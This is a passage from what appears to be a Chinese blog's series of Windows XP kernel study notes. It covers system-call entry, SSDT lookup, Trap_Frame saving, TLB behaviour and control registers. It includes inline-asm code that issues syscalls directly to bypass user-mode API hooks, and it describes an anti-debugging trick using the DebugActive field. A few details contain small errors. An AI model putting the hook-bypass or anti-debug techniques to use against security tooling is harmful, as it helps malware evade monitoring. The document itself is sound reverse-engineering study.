内核函数查找有了SSDT表，我们查找3环API对应的内核函数就很简单了，拿之前分析过的3环API函数ReadProcessMemory举例，在进入0环之前，给eax赋值了一个系统服务号0xba，那我们就用这个ba来查看这个这个函数在内核的实现。 通过这张图，可以很清晰的看出来，ReadProcessMemory所实现的功能，在底层是由一个叫做NtReadVirtualMemory完成的。 总结API函数的调用过程，从3环进入0环，再到找到对应的内核函数，这部分到这就差不多了，当然，真正的调用过程并没有到此结束，因为调用完0环的函数，总得返回3环呀！只是这部分需要用到APC的知识点，因此这里还不能完整实现。此外，在API函数调用这块，还有个小实验，在SSDT表中追加一个函数地址(NtReadVirtualMemory),自己编写API的3环部分调用这个新增的函数(注意：使用2-9-9-12分页，10-10-12会蓝屏)，就留到后面补上了 参考教程：https://www.bilibili.com/video/BV1NJ411M7aE?p=41 参考文章： https://www.cnblogs.com/joneyyana/p/12585469.html https://blog.csdn.net/qq_38474570/article/details/103674271 https://blog.csdn.net/qq_41988448/article/details/102994374","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"API函数的调用过程（保存现场）","slug":"API函数的调用过程（保存现场）","date":"2020-03-26T01:30:03.000Z","updated":"2020-03-27T13:45:22.749Z","comments":true,"path":"2020/03/26/API函数的调用过程（保存现场）/","link":"","permalink":"http://cata1oc.github.io/2020/03/26/API%E5%87%BD%E6%95%B0%E7%9A%84%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B%EF%BC%88%E4%BF%9D%E5%AD%98%E7%8E%B0%E5%9C%BA%EF%BC%89/","excerpt":"","text":"现在我们知道如何进入0环了，有两种方式，通过中断门或者快速调用。上一篇中最后留下了几个问题，其中一个就是关于如何保存那些3环寄存器原先的值（俗称保存现场），从而能够在执行完0环实现的功能后，顺利的返回到3环，今天我们就来探究一下这个问题，首先我们来认识几个结构：Trap_Frame，ETHREAD/KTHREAD，KPCR _Trap_Frame在Windbg中通过dt _KTrap_Frame进行查看 （0x7c~0x88）在保护模式下没有被使用，只在虚拟8086模式中用得到 （0x68~0x78）中断门进0环时，用于存储3环的CS，SS，ESP，EIP，EFLAGS （0x48~0x64）保存现场 （0x00~0x44）调式及其它作用 简要介绍完了Trap_Frame结构，了解了这是保存现场用到的结构，后面在分析KiSystemService时，会介绍保存现场的主要过程。 ETHREAD&KTHREADETHREAD（执行体线程块）是执行体层上的线程对象的数据结构。在Windows内核中，每个进程的每一个线程都对应着一个ETHREAD数据结构。 在Windbg中通过dt _ETHREAD进行查看 ETHREAD结构内嵌了一个KTHREAD对象作为第一个数据成员，因此一个指向ETHREAD对象的指针同时也是一个指向KTHREAD对象的指针。 在Windbg中通过dt _KTHREAD进行查看 大致先解下这些结构即可，后续在介绍到线程与进程处时，会慢慢分析各个字段。 KPCR描述： 全称为CPU控制区（Processor Control Region） 每一个CPU都有一个CPU控制区，跟TLB一样，一核一个KPCR 指令： dt _KPCR：查看KPCR结构 dd KeNumberProcessors：查看KPCR数量 dd KiProcessorBlock：查看KPCR位置 由于当前虚拟机只分配了一个核，所以数量是1 同理，因为单核，这里只显示了一个值，这个地址显示的是ffdff120，也就是KPCR偏移0x120的位置。KPCR偏移0x120的位置是 _KPRCB，可以理解为扩展的KPCR KiSystemService了解完上面介绍的结构，下面我们就可以分析一下0环函数KiSystemService，到底是如何保存现场的。 函数主体并不长，按照填充的结构不同我们来逐步分析。 0x1Code123456804df631 6a00 push 0 //ErrorCode804df633 55 push ebp804df634 53 push ebx804df635 56 push esi804df636 57 push edi804df637 0fa0 push fs 首先来看这一段，为什么要push 0起手呢？ 这里先回顾一下Trap_Frame结构。 这是一个结构，换句话说，就是进入0环后的堆栈将会像这种形式组织起来，在刚进0环是，esp是位于 (0x78) 的位置，我们知道，通过中断门进0环时，会将3环的寄存器压栈，包括CS，SS，EIP，ESP和EFLAGS。因此在进入0环后，ESP的位置是位于 (0x68) 处。虽然2E号中断只会压入5个值，但是有些情况会压入6个值，而第6个值，就是ErrCode，为了对齐，保持堆栈平衡，操作系统这里会自己补一个0，这也就解释了为什么第一步是push 0。 接下来，就是保存ebp，ebx，esi，esi，fs依次压栈，保存到Trap_Frame结构中描述的位置。 0x2Code1234567804df639 bb30000000 mov ebx,30h804df63e 8ee3 mov fs,bx //写入fs段寄存器804df640 ff3500f0dfff push dword ptr ds:[0FFDFF000h] //保存旧的异常链表(ExceptionList)804df646 c70500f0dfffffffffff mov dword ptr ds:[0FFDFF000h],0FFFFFFFFh //将新的异常链表赋值为-1804df650 8b3524f1dfff mov esi,dword ptr ds:[0FFDFF124h] //获取当前线程KTHREAD804df656 ffb640010000 push dword ptr [esi+140h] //将先前模式(PreviousMode)压栈804df65c 83ec48 sub esp,48h //提升堆栈（栈顶执行Trap_Frame头） 我们来看这部分做了什么事 首先是将段选择子0x30写入fs段寄存器 根据段选择子确定段描述符，然后可以发现fs指向的地方(0xffdff000)刚好是KPCR这个结构。 然后压栈了KPCR首地址位置的值 可以发现，KPCR首地址位置存的是异常链表(ExceptionList)，这里压栈了旧的异常链表，并将异常链表的值置为-1。至于异常链表的结构，留到后面再讲。 接着获取到KPCR + 0x124位置的值，并存入esi，然后将esi+0x140处的值压栈 可以发现KPCR+0x124处（赋给esi）的值，存的是当前线程（CurrentThread）的KTHREAD，我们再找到(esi)KTHREAD+0x140偏移，发现压栈的字段叫做先前模式（PerviousMode） 最后提升堆栈0x48个字节 经过这一部分的操作后，堆栈栈顶刚好指向_Trap_Frame的首地址，并完成了异常链表和先前模式的压栈操作。 0x3Code12345678804df65f 8b5c246c mov ebx,dword ptr [esp+6Ch] //取进入中断门压栈的CS804df663 83e301 and ebx,1 //计算出调用中断门前的权限804df666 889e40010000 mov byte ptr [esi+140h],bl //重新填写KTHREAD中的先前模式 804df66c 8bec mov ebp,esp //让ebp指向_Trap_Frame首地址804df66e 8b9e34010000 mov ebx,dword ptr [esi+134h] 804df674 895d3c mov dword ptr [ebp+3Ch],ebx //将旧的_Trap_Frame保存到edx中804df677 89ae34010000 mov dword ptr [esi+134h],ebp //更新_Trap_Frame804df67d fc cld 继续分析这一部分 我们来看前3行，它做了什么事呢，先取出_Trap_Frame 0x6C偏移处的值，即进入中断门前，程序CS的值，然后和1进行了与运算，并将bl的值，填入上面提到的先前模式 为什么和1进行与运算就可以算出先前模式呢？难道不直接填3吗？首先我们知道，Windows只用了0环和3环，其次，即使执行中断门，执行前的程序也可以是0环程序，所以保守起见，这里和CPL的最低位进行与运算；若结果为1，说明是3环程序执行了中断门，若为0，说明是0环程序执行的中断门。从而算出先前模式，并填入到当前线程KTHREAD的先前模式字段中。 上面3行更新了先前模式，接下来4行的作用就是更新了_Trap_Frame，我们知道栈顶指向Trap_Frame的首地址，现在让栈底也指向Trap_Frame的首地址，便于寻址。 由0x2的分析可知esi指向KTHREAD，KTHREAD+0x134则指向Trap_Frame，这里的Trap_Frame是旧的地址（这里则是Null），因此将它保存至堆栈，再将现在的Trap_Frame的地址写入，也就完成了更新。 cld指令修改了EFLAGS寄存器的DF位 0x4Code12345678910804df67e 8b5d60 mov ebx,dword ptr [ebp+60h] //取3环的ebp给ebx804df681 8b7d68 mov edi,dword ptr [ebp+68h] //取3环的eip给edi804df684 89550c mov dword ptr [ebp+0Ch],edx //edx存的是3环第一个参数的地址，赋到_Trap_Frame的DbgArgPointer的位置804df687 c74508000ddbba mov dword ptr [ebp+8],0BADB0D00h //将操作系统用的标志赋给DbgArgMark804df68e 895d00 mov dword ptr [ebp],ebx //将3环的ebp赋值到DbgEbp804df691 897d04 mov dword ptr [ebp+4],edi //将3环的eip赋值到DbgEip804df694 f6462cff test byte ptr [esi+2Ch],0FFh //判断DebugActive处的值是否为-1804df698 0f858efeffff jne nt!Dr_kss_a (804df52c) //跳转至调试寄存器保存函数804df69e fb sti804df69f e9dd000000 jmp nt!KiFastCallEntry+0x8d (804df781) 来看最后一部分 前6行，很好理解，主要是对_Trap_Frame调试部分的填充，一张图就可以概括 接下来的两行，会比较esi+0x2C的位置是否为-1 这个地方值如果不是-1，说明处于调试状态，紧接着会跳转到Dr_kss_a这个例程里，这个例程作用是将Dr0~Dr7这些调试寄存器的值保存到_Trap_Frame中，用于调试。同样的，了解了这个字段后，我们可以写一个程序，不断的修改这个值，将DebugActive这个值置为-1，这样程序就不会保存调试寄存器，也就无法调试，这是一种反调试的手段。 最后，程序会跳转到KiFastCallEntry+0x8D这个位置继续执行，而这个位置，也是KiFastCallEntry执行完后跳转的地方。之所以分了两种方式，是因为中断门进0环时，压栈了5个值（ESP，EIP，CS，SS，EFLAGS）而快速调用没有，导致它们在填写_Trap_Frame结构的方式不同，但是在填完后，保存现场以后，后面执行的函数就一样了。 KiFastCallEntryKiFastCallEntry保存现场的方式略微发杂，因为没有通过中断门对3环的5个寄存器进行压栈。由于分析的代码较多，这部分就不贴图了，可以参照KiSystemService的方法，在Windbg中找到对应结构进行分析。 KiFastCallEntry要分为两个部分来看，第一个部分，是和KiSystemService所做的一样，对_Trap_Frame结构的填充，进行保存现场。完了之后，第二个部分，从KiFastCallEntry+0x8D开始，这是KiSystemService执行完后跳转的地方，也是KiFastCallEntry顺序执行的地方，是双方都要执行的代码，这也意味着，从这个地方开始，两种进0环的方式就统一了。 本篇只介绍第一部分，看看KiFastCallEntry在填充_Trap_Frame时与KiSystemService有何不同吧。 Code12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849kd> u KiFastCallEntry L55nt!KiFastCallEntry:804df6f0 b923000000 mov ecx,23h804df6f5 6a30 push 30h804df6f7 0fa1 pop fs //令fs寄存器指向KPCR首地址804df6f9 8ed9 mov ds,cx //令ds=0x23804df6fb 8ec1 mov es,cx //令es=0x23804df6fd 8b0d40f0dfff mov ecx,dword ptr ds:[0FFDFF040h] //另ecx指向TSS 804df703 8b6104 mov esp,dword ptr [ecx+4] //取TSS中的esp0赋值给当前esp804df706 6a23 push 23h //将3环ss压栈(_Trap_Frame+0x78)804df708 52 push edx //将3环栈顶esp3压栈(+0x74)804df709 9c pushfd //将eflags寄存器压栈(+0x70)804df70a 6a02 push 2 804df70c 83c208 add edx,8 //获取外部第一个参数的位置(ReadProcessMemory共Call804df70c //了两次才到sysenter，因此压栈了2个返回地址，需要+8)804df70f 9d popfd //将2写入eflags寄存器804df710 804c240102 or byte ptr [esp+1],2 //没看懂有啥用804df715 6a1b push 1Bh //将3环cs压栈(+0x6c)804df717 ff350403dfff push dword ptr ds:[0FFDF0304h] //将3环eip压栈(+0x68)804df71d 6a00 push 0 //将Errcode压栈(+0x64)804df71f 55 push ebp //将3环ebp压栈(+0x60)804df720 53 push ebx //将3环ebx压栈(0x5c)804df721 56 push esi //将3环esi压栈(+0x58)804df722 57 push edi //将3环edi压栈(+0x54)804df723 8b1d1cf0dfff mov ebx,dword ptr ds:[0FFDFF01Ch] //将指向KPCR自己的指针存到ebx里804df729 6a3b push 3Bh //将3环fs压栈(+0x50)804df72b 8bb324010000 mov esi,dword ptr [ebx+124h] //将当前线程的KTHREAD存到esi804df731 ff33 push dword ptr [ebx] //将异常链表(ExceptionList)压栈(+0x4c)804df733 c703ffffffff mov dword ptr [ebx],0FFFFFFFFh //更新异常链表的值为-1804df739 8b6e18 mov ebp,dword ptr [esi+18h] //通过KTHREAD的InitialStack更新0环栈底804df73c 6a01 push 1 //将旧的先前模式(PreviousMode)压栈(+0x48)804df73e 83ec48 sub esp,48h //令esp指向_Trap_Frame首地址804df741 81ed9c020000 sub ebp,29Ch //这部分没看懂，舒默的分析是计算初试stack的Trap_Frame基址804df741 //这个0x29c的值等于：NPX_FRAME_LENGTH + TRAP_FRAME_LENGTH804df741 //其中NPX_FRAME_LENGTH = 0x210, TRAP_FRAME_LENGTH = 0x8c804df747 c6864001000001 mov byte ptr [esi+140h],1 //更新先前模式为1804df74e 3bec cmp ebp,esp //比较两个Trap_Frame基址，若不同则跳转去处理804df750 0f8572ffffff jne nt!KiFastCallEntry2+0x24 (804df6c8)804df756 83652c00 and dword ptr [ebp+2Ch],0 //将Dr7的值置0(+0x2c)804df75a f6462cff test byte ptr [esi+2Ch],0FFh //判断当前线程的DebugActive是否为-1804df75e 89ae34010000 mov dword ptr [esi+134h],ebp //更新当前线程的_Trap_Frame基址804df764 0f8546feffff jne nt!Dr_FastCallDrSave (804df5b0)//若DebugActive不为-1则跳转804df76a 8b5d60 mov ebx,dword ptr [ebp+60h] //将3环的Ebp赋值给当前ebx804df76d 8b7d68 mov edi,dword ptr [ebp+68h] //将3环的Eip赋值给当前edi804df770 89550c mov dword ptr [ebp+0Ch],edx //将第一个参数的地址存到DbgArgPointer804df773 c74508000ddbba mov dword ptr [ebp+8],0BADB0D00h //将0x0BADB0D00存到DbgArgMark804df77a 895d00 mov dword ptr [ebp],ebx //将3环ebp存到DbgEbp804df77d 897d04 mov dword ptr [ebp+4],edi //将3环eip存到DbgEip804df780 fb sti //设置EFLAGS的IF位，允许中断发生 这里就先分析到这，至于从KiFastCallEntry+0x8D开始的第二部分，由于是KiSystemService和KiFastCallEntry的公共代码，两种进0环的方式都会执行，就不再本篇中分析了，留到下一篇介绍系统服务表和SSDT时再介绍。 总结这一篇通过学习_Trap_Frame，KTHREAD，KPCR这些结构，分析KiSystemService&KiFastCallEntry了解了在进入0环后，保存现场的方式。尽管采用了两种不同的手段，但是思路总体来说是一样的，就是通过填充Trap_Frame结构完成3环寄存器的保存。在下一篇中，我们将继续探究，在保存完现场后，程序是如何找到想要执行的函数的。 参考教程：https://www.bilibili.com/video/BV1NJ411M7aE?p=40 参考文章：https://blog.csdn.net/qq_41988448/article/details/102886413 ​ https://blog.csdn.net/qq_38474570/article/details/103652993","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"API函数的调用过程（3环进0环）","slug":"API函数的调用过程（3环进0环）","date":"2020-03-25T12:40:57.000Z","updated":"2020-03-25T16:44:04.591Z","comments":true,"path":"2020/03/25/API函数的调用过程（3环进0环）/","link":"","permalink":"http://cata1oc.github.io/2020/03/25/API%E5%87%BD%E6%95%B0%E7%9A%84%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B%EF%BC%883%E7%8E%AF%E8%BF%9B0%E7%8E%AF%EF%BC%89/","excerpt":"","text":"上一篇中分析了ReadProcessMemory函数的3环部分，它实际上没有做太多工作，只是提供了一个调用0环函数的接口，今天我们接着向下分析，看看函数是如何进入0环的。 _KUSER_SHARED_DATA_KUSER_SHARED_DATA结构 上一篇讲到了NtReadVirtualMemory这部分，调用了一个函数地址0x7FFE0300。那这个地址有什么用呢？这就要介绍一个新的结构_KUSER_SHARED_DATA： 在User层和Kernel层分别定义了一个_KUSER_SHARED_DATA结构区域，用于User层和Kernel层共享某些数据 它们使用固定的地址值映射，_KUSER_SHARED_DATA结构区域在User和Kernel层地址分别为： User层地址为：0x7FFE0000 Kernel层地址为：0xFFDF0000 虽然指向的是同一个物理页，但在User层是只读的，在Kernel层是可写的 SystemCall现在我们知道，0x7FFE0000处是_KUSER_SHARED_DATA结构，使用dt指令查看结构，查找0x300偏移处，也就是0x7FFE0300的位置，这个字段是SystemCall 那这个SystemCall有什么用呢？ SystemCall的作用是选择以什么方式进入0环。这要看CPU是否支持sysenter/sysexit 支持：ntdll.dll!KiFastSystemCall() 不支持：ntdll.dll!KiFastSystemCall() 那如何看CPU是否支持sysenter/sysexit指令呢？ （OD打开任一程序）将eax置1（参数） 将ecx，edx置0（方便查看） 执行指令cpuid 查看edx的SEP位（下标11的位置），若值为1，说明支持sysenter/sysexit FBFF -> 1111 1011 1111 1111 说明本机支持sysenter/sysexit KiIntSystemCall进0环在学过调用门，中断门后，我们知道，凡是提权（例如进0环），都伴随着寄存器中的值发生改变，包括CS，SS，EIP，ESP。所以我们分别分析一下两种进0环方式，看看他们是如何修改寄存器的值的，先从KiIntSystemCall开始。 获取提权后寄存器的值 KiIntSystemCall进0环的方式非常简单，就是我们最熟悉中断门。（这里第一条指令的作用是获取参数的首地址） 中断门就很熟悉了，进入IDT表看下0x2E对应的门描述符 根据中断门描述符，可以很快得到： CS = 0x8 EIP = 8053e481 至于SS，和ESP，会在程序提权时，由tr寄存器指向的TSS中的ESP0和SS0提供。 KiSystemService根据EIP的值，0x8053e481我们可以定位到一个内核函数KiSystemService 这样就说明进入0环了，所以KiIntSystemCall进0环非常好理解，就是中断门的知识，进入0环后，就跳转到KiSystemService继续执行，至于如何找到想要执行的函数，会在后面的文章中介绍。接下来我们来看支持sysenter/sysexit的KiFastSystemCall是如何进入0环的。 KiFastSystemCall进0环事实上，基本上现在的CPU都支持sysenter/sysexit，默认也是通过KiFastSystemCall进0环，为什么呢？顾名思义，因为快啊。因为KiFastSystemCall不需要像中断门进0环时，去查IDT表找CS，EIP，查TSS找ESP和SS，而是直接从寄存器里读取这些数据。 获取提权后寄存器的值 来看KiFastSystemCall，只有两行指令。sysenter指令，又称作快速调用，当CPU支持sysenter指令时，操作系统会提前将CS，SS，ESP，EIP写入到MSR寄存器中，当sysenter指令执行时，CPU直接从MSR中将这些值写入相应寄存器中，没有读取内存的过程，所以叫做快速调用。 MSR寄存器由于MSR寄存器非常大，这里不细讲，只列出用到的值 可以通过RDMSR/WRMST来进行读写（操作系统使用WRMST写该寄存器） 这里读取ESP，EIP，CS的值（SS的值可以通过CS+8计算而得） 这样，在进入0环时，便能通过MSR寄存器切换4个寄存器的值了 KiFastCallEntry前面讲了KiIntSystemCall进入0环后执行KiSystemService，KiFastSystemCall当然也有，执行的是另一个函数，通过MSR得到的EIP我们可以找到函数KiFastCallEntry，同样是内核函数。 这样便成功进入0环了。 总结进0环的过程非常好理解，一种是咱们熟悉的中断门，另一种快速调用，也仅仅是利用了寄存器实现，不是很困难。但是有没有考虑一个问题，我们虽然成功的从3环进入到0环了，那该怎么出来呢？3环程序调用API实现功能，总该返回继续执行程序吧。既然要从0环返回3环，那就得恢复原来的寄存器的值，那么这些值又保存到了哪里呢？除此之外，现在进入了0环了，但又如何找到所要执行的函数呢？带着这些问题，我们继续学习下面的知识。 参考教程：https://www.bilibili.com/video/BV1NJ411M7aE?p=39 参考文章：https://blog.csdn.net/qq_41988448/article/details/102825241","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"API函数的调用过程（3环部分）","slug":"API函数的调用过程（3环部分）","date":"2020-03-25T07:09:24.000Z","updated":"2020-03-25T10:15:51.746Z","comments":true,"path":"2020/03/25/API函数的调用过程（3环部分）/","link":"","permalink":"http://cata1oc.github.io/2020/03/25/API%E5%87%BD%E6%95%B0%E7%9A%84%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B%EF%BC%883%E7%8E%AF%E9%83%A8%E5%88%86%EF%BC%89/","excerpt":"","text":"保护模式暂时告一段落了，接下来开始API函数调用的学习，来一步步分析Windows在调用API的过程中到底做了些什么事，函数到底是如何实现的。 Windows API Application Programming Interface，简称API函数 Windows有多少个API？ 上万个，主要存放在 C:\\WINDOWS\\system32 下面所有的dll中 几个重要的DLL Kernel32.dll：最核心的功能模块， 比如管理内存、进程和线程相关的函数等。 User32.dll：是Windows用户界面相关应用程序接口，如创建窗口和发送消息等。 GDI32.dll：全称是Graphical Device Interface（图形设备接口），包含用于画图和显示文本的函数。例如，要显示一个程序窗口，就调用了其中的函数来画这个窗口。 Ntdll.dll：大多数API都会通过这个DLL进入内核（0环）。 分析ReadProcessMemory为了能够直观的了解API的调用过程，我们来分析一个Windows API函数，ReadProcessMemory，这个API函数位于Kernel32.dll，功能是读取指定进程的内存，打开IDA我们来看看它都做了些什么。 ReadProcessMemory在Kernel32.dll中选择导出函数，按下Ctrl+F，然后搜索ReadProcessMemory 找到后进入函数主体 我们可以看到，ReadProcessMemory函数总体分为3个部分，首先是参数的压栈，其次调用了一个函数NtReadVirtualMemory，接着就开始处理函数的返回值了，可以发现，真正读取内存的功能并不是在ReadProcessMemory中实现的，所以我们需要进一步去查看NtReadVirtualMemory。 把鼠标放在NtReadVirtualMemory上，发现该函数是外部函数，不属于Kernel32.dll，所以我们得去Kernel32.dll的导入函数中找一下这个函数属于哪个dll。 可以见得，NtReadVirtualMemory属于Ntdll.dll，接下来进入NtReadVirtualMemory继续分析。 NtReadVirtualMemory找到函数主体的步骤和上面一样，不再赘述。 NtReadVirtualMemory的函数主体部分只有4行，其中最关键的是前两行： mov eax, 0BAh：这一步给eax赋值了一个编号，这个编号的作用是在进入0环后，找到真正需要调用的函数。记住，这个编号存在eax中。 mov edx, 7FFE03000h：这一步同样关键，这是一个函数地址。它决定了进入0环的方式（具体在下一篇中会详细分析），同样，也要记住edx存了这个值。 经过简单的分析，可以发现，在3环层面上， 并没有真正实现函数的功能，API函数的实现，大部分都在0环（只有少部分函数是在3环实现）。拿ReadProcessMemory来说，只是相对于0环给上层提供的一个接口，通过这个接口，我们可以实现读取指定地址的内存 重写API函数现在我们知道，API函数的真正实现实际上是在底层（0环），3环上的API函数实际上只是起到一个接口的作用。那么我们可以自己重写3环的API，自己去调用0环函数，这样做的好处是，可以避免3环恶意挂钩（例如有黑客Hook了OpenFile函数，每次我们调用OpenFile时，黑客就知道我们打开了什么文件，如果重写API函数，黑客就无法通过Hook OpenFile函数来获取我们打开的文件内容，除非黑客在0环动手脚） 实现功能 实现的功能大致如此，读取变量a所在地址的内容，将内容改写后，再写入该地址，先用Windows API提供的ReadProcessMemory和WriteProcessMemory实现一遍。可以看到，原本变量a的值为0x123，随后被修改成了0x567 重写ReadProcessMemory这里以ReadProcessMemory为例，在先前的分析中， 我们知道ReadProcessMemory仅仅做了参数压栈的工作，而NtReadVirutalMemory先给eax赋值了一个编号，接着给edx赋了一个函数地址，并调用此函数，然后平衡堆栈。所以我们只需要将这些功能组合一下即可： c1234567891011121314151617181920212223void _stdcall MyReadProcessMemory( HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, DWORD nSize, LPDWORD lpNumberOfBytesRead){ _asm { //ReadProcessMemory lea eax, [ebp+0x14] push eax //lpNumberOfBytesRead push [ebp+0x14] //nSize push [ebp+0x10] //lpBuffer push [ebp+0xC] //lpBaseAddress push [ebp+0x8] //hProcess //NtReadVirtualMemory mov eax, 0xBA mov edx, 0x7FFE0300 call dword ptr [edx] add esp, 0x14 }} 当然，仅仅这样做还不够，这样虽然编译能过，但是执行会报错。因为在ReadProcessMemory中调用NtReadVirutalMemory用了call语句，call语句的使用会导致返回地址压栈，也因此，我们重写的API函数在执行 Code1call dword ptr [edx] 这条语句时，esp处的值为hProcess，而Windows在执行这条语句时，[esp+4]处的值才是hProcess！如果这里不做修改，后面函数返回时，堆栈会不平衡，因此我们需要手动修改一下堆栈： 增加了这两行后，我们自己重写的ReadProcessMemory就算完成了。同理，WriteProcessMemory也是如此。 实验结果 可以看到，我们使用了自己重写的API函数，但是实现了同样的功能。同理，别的函数也可以通过重写，从而防止3环的恶意挂钩。 完整代码c12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#include \"stdafx.h\"#include void _stdcall MyReadProcessMemory( HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, DWORD nSize, LPDWORD lpNumberOfBytesRead){ _asm { //ReadProcessMemory lea eax, [ebp+0x14] push eax //lpNumberOfBytesRead push [ebp+0x14] //nSize push [ebp+0x10] //lpBuffer push [ebp+0xC] //lpBaseAddress push [ebp+0x8] //hProcess //NtReadVirtualMemory sub esp, 0x4 //Call NtReadVirtualMemory mov eax, 0xBA mov edx, 0x7FFE0300 call dword ptr [edx] add esp, 0x18 }}void _stdcall MyWriteProcessMemory( HANDLE hProcess, LPVOID lpBaseAddress, LPVOID lpBuffer, DWORD nSize, LPDWORD lpNumberOfBytesWritten){ _asm { //WriteProcessMemory lea eax, [ebp+0x8] //hProcess push eax //lpNumberOfBytesRead push [ebp+0x14] //NumberOfBytesToWrite push [ebp+0x10] //lpBuffer push [ebp+0xC] //lpBaseAddress push [ebp+0x8] //hProcess //NtWriteVirtualMemory sub esp, 0x4 //Call NtWriteirtualMemory mov eax, 0x115 mov edx, 0x7FFE0300 call dword ptr [edx] add esp, 0x18 }}int main(int argc, char* argv[]){ int a = 0x123; int buffer = 0; printf(\"Before: a=%x\", a); MyReadProcessMemory(GetCurrentProcess(), &a, &buffer, 4, NULL);// printf(\"%x\", buffer); buffer = 0x567; getchar(); MyWriteProcessMemory(GetCurrentProcess(), &a, &buffer, 4, NULL); printf(\"After: a=%x\\n\", a); getchar(); return 0;} 总结对于API函数的调用过程，我们对三环的部分有了一定的了解，发现，大部分API的实现都是在0环，接下来的文章中，我们就跟进去，找找API函数在0环中的实现在哪。 参考教程：https://www.bilibili.com/video/BV1NJ411M7aE?p=37 参考文章：https://blog.csdn.net/qq_41988448/article/details/102786700 参考资料：Joney的笔记，张嘉杰的笔记，XIAOYSHIJI的代码","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"TLB，控制寄存器","slug":"TLB，控制寄存器","date":"2020-03-24T01:14:36.000Z","updated":"2020-03-24T09:53:26.650Z","comments":true,"path":"2020/03/24/TLB，控制寄存器/","link":"","permalink":"http://cata1oc.github.io/2020/03/24/TLB%EF%BC%8C%E6%8E%A7%E5%88%B6%E5%AF%84%E5%AD%98%E5%99%A8/","excerpt":"","text":"保护模式的内容接近尾声，这一篇文章补充一下琐碎的知识点，下面先从TLB开始 TLB设计原因 假设我们通过一个线性地址访问一个物理页，想要去读取物理页上某个字节。但是实际过程中，并非只读了1个字节，我们需要先读取PDE，再读取PTE，最后再读取存放1个字节的物理页，读取的内容远远超过1个字节了。 在2-9-9-12分页下，会多读24个字节，如果读取的内容跨页了（存在两个不同的物理页上），那多读的字节会更多 为了提高效率，只能通过做记录来进行弥补。 因此CPU内部设计了一个表，用来做记录；由于位于CPU内部，速度和寄存器一样快，当然，表也不能做的过大。这个表叫做TLB（Translation Lookaside Buffer），用于地址解析 TLB结构 LA（线性地址） PA（物理地址） ATTR（属性） LRU（统计） xxxxxxxx xxxxxxxx xxxxxxxx xxxxxxxx 说明： ATTR（属性)：PAE分页，用PDPE&PDE&PTE。10-10-12分页则PDE&PTE 不同CPU的TLB表大小不一样 只要Cr3改变了（说明进程切换了），先前的TLB则会失效，换一套新的TLB，一核一套TLB 由于操作系统中的高2G映射基本不变，如果Cr3改了，直接刷新TLB，对于重建高2G以上的对应关系很浪费，所PDE和PTE中有个标志位G位，刷新TLB时将不会刷新PDE/PTE的G位为1的页。若TLB满了，则CPU会根据统计信息将不常用的地址废弃，保留最近最常用的 注意：只有当PDE的PS位为1时（即当前物理页为大页），G位才有效。 TLB种类TLB在x86体系的CPU里的实际应用最早是从Intel的486CPU开始的，在x86的CPU里，一般都设有如下4组TLB： 缓存一般页表（4K字节页面）的指令页表缓存（Instruction-TLB） 缓存一般页表（4K字节页面）的数据页表缓存（Data-TLB） 缓存大尺寸页表（2M/4M字节页面）的指令页表缓存（Instruction-TLB） 缓存大尺寸页表（2M/4M字节页面）的数据页表缓存（Instruction-TLB） TLB验证呵呵，这个破实验花了我一下午，我真是太菜了，一个原因是0地址挂物理页，踩了好几次坑，第二个是VC6很多强转不支持，耽误了很多时间。给0地址挂物理页的步骤就不赘述了，这里采用的10-10-12分页，只是采用了代码挂物理页的方式，具体可以参考基址小实验这一篇，这里就讲讲验证的过程。 我们先给0地址挂上第一个地址（0x425000，这是我随便选的，选错了可能蓝屏）的物理页，然后取0地址的处的置，发现值为0。 这时，我们注释掉给0地址挂第一个地址（0x425000）的物理页的代码，并给0地址挂第二个地址（0x426000）的物理页。这时再取0地址处的值，发现值为0x43，可以发现，这两个线性地址所对应的物理页上的值是不同的。 这时我们把上面的注释拿掉，先给0地址挂第一个地址的物理页，然后再给0地址挂第二个地址的物理页，按照道理，这时我们取到的值应该是第二个地址对应物理页上的值，我们来查看结果： 神奇的事情发生了，我们取到的仍然是第一个地址对应物理页上的值，这其实就是TLB的作用。 这时，我们增加一条语句 Code1invlpg dword ptr ds:[0] 再次运行程序发现，仅仅多了这一条语句，读取0地址的值，就变成了第二个地址对应物理页上的值，Invlpg是让指定页TLB无效化的指令，因此再次访问时，原先的TLB已经被废弃，就需要重新去物理页读取，此时0地址对应的物理页已经是第二个地址的物理页了。当然，除了使用Invlpg指令，修改Cr3也可以做到让TLB无效化。 下面附上完整代码 c1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include \"stdafx.h\"#include DWORD phyAddr, phyAddr2, temp;__declspec(naked) Test() { _asm { pushad pushfd } phyAddr = (DWORD)(0xc0000000 + ((0x425000 >> 0xa) & 0x3ffffc)); phyAddr2 = (DWORD)(0xc0000000 + ((0x426000 >> 0xa) & 0x3ffffc)); _asm{ mov eax, phyAddr mov eax, [eax] mov dword ptr ds:[0xc0000000], eax mov eax, dword ptr ds:[0] mov temp, eax// invlpg dword ptr ds:[0] 无效化指定页的TLB// mov eax, cr3 切换Cr3来清空TLB// mov cr3, eax mov eax, phyAddr2 mov eax, [eax] mov dword ptr ds:[0xc0000000], eax mov eax, dword ptr ds:[0] mov temp, eax } _asm{ popfd popad retf }}int main(int argc, char* argv[]){ char buffer[] = {0, 0, 0, 0, 0x4B, 0}; _asm call fword ptr buffer printf(\"temp: %x\", temp); getchar(); return 0;} 控制寄存器说完了TLB，来说说控制寄存器。控制寄存器的作用主要是用于控制和确定CPU的操作模式。主要包括Cr0，Cr1，Cr2，Cr3，Cr4，其中Cr1保留。 